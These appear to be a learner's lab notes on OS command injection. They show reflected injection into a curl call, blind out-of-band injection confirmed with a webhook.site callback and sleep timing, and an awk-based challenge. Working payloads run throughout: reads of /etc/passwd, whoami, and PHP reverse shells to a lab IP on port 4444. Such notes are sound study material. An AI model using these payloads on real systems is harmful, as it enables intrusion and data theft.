
Application is taking an input and passing it to a function that executes it as code and not as data

Eval is evil

Command running is Command: curl -I -s -L | grep "HTTP/"

i/p : ;cat /etc/passwd;asd
command becomes : curl -I -s -L ;cat /etc/passwd;asd | grep "HTTP/"

no i/p given to curl so it will thorw an error print the /etc/passwd file data pass random data to grep command

use ; to separate commands

i/p : ; whoami ; asd
command : curl -I -s -L ;whoami;asd | grep "HTTP/"
o/p : www-data

i/p : ;which php;asd
command : curl -I -s -L ;which php;asd | grep "HTTP/"
o/p : /usr/local/bin/php

Start netcat

i/p : ;/usr/local/bin/php -r '$sock=fsockopen("192.168.57.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");';asd

Bash one liner dosent work so we used php 
and we get a reverse shell


---

### Blind Command Injection

Prompt to input a website name

we get OK back

probably from response code 200 OK

test a non existent website name to see response

we get website not found

i/p: https://tcm-sec.com ; whoami; asd

we get OK again but out ; are being filtered

i/p : \https://webhook.site/c50292e9-da33-4700-a16c-a67e8da/? \`whoami\`

***this is out of band command injection since we have to catch it at other place reather than it being reflected back to us***

***whoami inside backtiks which will be interpreted as a command and executed***

o/p : user is www-data

i/p : \http://localhost/?\`sleep 10\`

and it takes 10 seconds to respond

***Blind Command Injection : Even though we cannot see the result, out command is being executed***

To test for Blind command Injection try things like

- sleep
- create a new file : use the file command on newly created file , if it shows response means file was created that means our command of creating the file ran 


---

### Command Injection Challenge


i/p: 100 200

Executed: awk 'BEGIN {print sqrt(((100-50)^2) + ((200-50)^2))}'  
Result: 158.114

**1. AWK Operations:**   
(a) Scans a file line by line   
(b) Splits each input line into fields   
(c) Compares input line/fields to pattern   
(d) Performs action(s) on matched lines

try command injection on 2nd payload

i/p 100 50)^2))}';whoami;

o/p: Executed: awk 'BEGIN {print sqrt(((100-100)^2) + ((200-50)^2))}';whoami;)^2))}'  
Result:

we get no result

i/p:

100 50)^2))}';whoami;#

add hash to comment out rest of command

o/p: Executed: awk 'BEGIN {print sqrt(((100-100)^2) + ((200-50)^2))}';whoami;#)^2))}'  
Result: 150 www-data

i/p: 100 50)^2))}';php -r '$sock=fsockopen("192.168.57.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");';#

![[commandInjection.png]]

And we get Reverse shell

**dont forget the hash to ccomment out rest of command**

---




